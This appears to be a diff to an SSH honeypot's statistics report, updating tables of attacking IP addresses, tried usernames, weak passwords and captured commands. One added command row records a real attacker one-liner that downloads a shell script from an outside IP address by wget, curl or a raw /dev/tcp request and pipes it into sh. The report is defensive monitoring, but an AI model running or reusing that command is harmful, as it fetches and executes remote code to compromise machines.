@@ -13,53 +13,52 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 120.55.180.31 | 15607 |
-| 8.217.45.128 | 4804 |
-| 47.92.138.212 | 4451 |
-| 121.40.26.87 | 4380 |
-| 47.83.19.179 | 4201 |
-| 47.242.12.97 | 491 |
-| 39.105.113.134 | 245 |
-| 116.162.221.180 | 159 |
-| 182.92.184.221 | 159 |
-| 222.219.132.221 | 159 |
+| 59.110.221.129 | 4629 |
+| 39.100.33.130 | 4507 |
+| 39.105.102.121 | 4365 |
+| 47.238.249.246 | 4338 |
+| 47.242.109.251 | 4338 |
+| 47.243.11.108 | 4196 |
+| 47.243.71.56 | 4185 |
+| 8.217.10.15 | 2055 |
+| 47.74.46.213 | 1198 |
+| 47.237.132.148 | 994 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 1707 |
-| sam | 512 |
-| sandeep | 510 |
-| toor | 509 |
-| apache | 508 |
-| testing | 508 |
-| william | 508 |
-| deploy | 507 |
-| gitlab | 507 |
-| centos | 506 |
+| root | 2782 |
+| admin | 19 |
+| debian | 15 |
+| test | 14 |
+| ubuntu | 14 |
+| deamon | 13 |
+| oracle | 10 |
+| postgres | 9 |
+| user | 9 |
+| zabbix | 9 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 451 |
-| prasun | 21 |
-| mojymiri | 21 |
-| mafi | 21 |
-| eta | 21 |
-| devanshi2 | 21 |
-| casangjo | 21 |
-| avella | 21 |
-| amirfma | 21 |
-| amey | 21 |
+| 123456 | 318 |
+| 111111 | 49 |
+| Server123@ | 28 |
+| password | 18 |
+| kontol | 16 |
+| 1Qaz@wsx | 15 |
+| 1234 | 15 |
+| test | 14 |
+| deamon | 13 |
+| debian | 9 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 140.246.64.72 | uname -s -m |
-| 116.162.221.180 | uname -s -m |
-| 222.219.132.221 | uname -s -m |
-| 47.251.99.255 | uname -s -m |
-| 182.92.184.221 | uname -s -m |
+| 87.120.113.231 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
+| 47.251.100.22 | uname -s -m |
+| 31.220.82.183 | uname -s -m |
+| 31.57.241.17 | uname -s -m |
